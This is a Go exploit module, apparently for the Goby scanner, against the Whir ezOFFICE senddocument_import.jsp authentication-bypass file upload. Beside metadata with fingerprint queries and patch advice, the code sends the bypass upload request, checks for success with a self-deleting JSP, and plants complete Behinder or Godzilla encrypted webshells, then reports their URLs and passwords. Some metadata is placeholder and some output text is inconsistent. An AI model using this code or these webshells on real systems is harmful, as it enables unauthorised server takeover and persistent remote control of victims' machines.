package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "whir ezOFFICE senddocument_import.jsp file upload vulnerability",
    "Description": "<p>Whir zOFFICE collaborative management platform is a collaborative office system covering portal customization platform, information knowledge platform, workflow platform, document management platform, communication platform, personal office platform, comprehensive office platform, and human resources management.</p><p>Whir ezOFFICE collaborative management platform senddocument_import.jsp has authentication bypass and can upload arbitrary files. Attackers can upload malicious Trojans to obtain server permissions.</p>",
    "Product": "Whir-ezOFFICE",
    "Homepage": "http://www.whir.net/cn/ezofficeqyb/index_52.html",
    "DisclosureDate": "2023-02-13",
    "Author": "h1ei1",
    "FofaQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "GobyQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "Level": "3",
    "Impact": "<p>Whir ezOFFICE collaborative management platform senddocument_import.jsp has authentication bypass and can upload arbitrary files. Attackers can upload malicious Trojans to obtain server permissions.</p>",
    "Recommendation": "<p>1. Currently, the manufacturer has released security patches, please update them in time: <a href=\"http://www.whir.net/.\">http://www.whir.net/.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder",
            "show": "attackType=webshell"
        },
        {
            "name": "content",
            "type": "input",
            "value": "154as5f15g4t5j5w4sa",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "万户网络 ezOFFICE senddocument_import.jsp 文件上传漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p>万户 zOFFICE 协同管理平台是一款涵盖门户自定义平台、信息知识平台、工作 流程平台、公文管理平台、通讯沟通平台、个人办公平台、综合办公平台、人力资源管理的协同办公系统。</p><p>万户 ezOFFICE 协同管理平台 senddocument_import.jsp 存在鉴权绕过并且可以上传任意文件，攻击者可上传恶意木马获取服务器权限。</p>",
            "Recommendation": "<p>1、目前厂商已发布安全补丁，请及时更新：<a href=\"http://www.whir.net/\">http://www.whir.net/</a>。<br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>万户 ezOFFICE 协同管理平台 senddocument_import.jsp 存在鉴权绕过并且可以上传任意文件，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "whir ezOFFICE senddocument_import.jsp file upload vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>Whir zOFFICE collaborative management platform is a collaborative office system covering portal customization platform, information knowledge platform, workflow platform, document management platform, communication platform, personal office platform, comprehensive office platform, and human resources management.</p><p>Whir ezOFFICE collaborative management platform senddocument_import.jsp has authentication bypass and can upload arbitrary files. Attackers can upload malicious Trojans to obtain server permissions.</p>",
            "Recommendation": "<p>1. Currently, the manufacturer has released security patches, please update them in time: <a href=\"http://www.whir.net/.\">http://www.whir.net/.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Whir ezOFFICE collaborative management platform senddocument_import.jsp has authentication bypass and can upload arbitrary files. Attackers can upload malicious Trojans to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-08",
    "PocId": "10836"
}`
	uploadFileS1D5134sdjknpooooo := func(u *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		uri := "/defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;ad?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp"
		postConfig := httpclient.NewPostRequestConfig(uri)
		postConfig.VerifyTls = false
		postConfig.FollowRedirect = false
		postConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryvLNvGnzm2o3sImhz")
		postConfig.Data = "------WebKitFormBoundaryvLNvGnzm2o3sImhz\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"1111.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n" + payload + "\r\n------WebKitFormBoundaryvLNvGnzm2o3sImhz\r\nContent-Disposition: form-data; name=\"continueUpload\"\r\n\r\n0\r\n------WebKitFormBoundaryvLNvGnzm2o3sImhz\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n导　入\r\n------WebKitFormBoundaryvLNvGnzm2o3sImhz--\r\n"
		return httpclient.DoHttpRequest(u, postConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			payload := "<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"
			if resp, _ := uploadFileS1D5134sdjknpooooo(u, payload); resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "var saveName") {
				matches := regexp.MustCompile("var saveName=\"(.*?)\\.jsp\";").FindStringSubmatch(resp.RawBody)
				if len(matches) < 2 {
					return false
				}
				getConfig := httpclient.NewGetRequestConfig(`/defaultroot/upload/loginpage/` + matches[1] + `.jsp;fds`)
				getConfig.VerifyTls = false
				getConfig.FollowRedirect = false
				resp, _ := httpclient.DoHttpRequest(u, getConfig)
				return resp != nil && strings.Contains(resp.RawBody, "e165421110ba03099a1c0393373c5b43")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var content string
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				if webshell == "behinder" {
					content = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"
				} else if webshell == "godzilla" {
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
				}
			} else if attackType == "custom" {
				content = goutils.B2S(ss.Params["content"])
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			if resp, err := uploadFileS1D5134sdjknpooooo(expResult.HostInfo, content); err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else if resp != nil && strings.Contains(resp.RawBody, "var saveName=") {
				fileName := regexp.MustCompile(`var saveName="(.*?)\.jsp";`).FindStringSubmatch(resp.RawBody)
				expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/defaultroot/upload/loginpage/%s.jsp;fds\n", fileName[1])
				expResult.Success = true
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.0.1\n"
				}
				if attackType == "webshell" {
					expResult.Output += "Webshell type: JSP"
				}
			} else {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
			}
			return expResult
		},
	))
}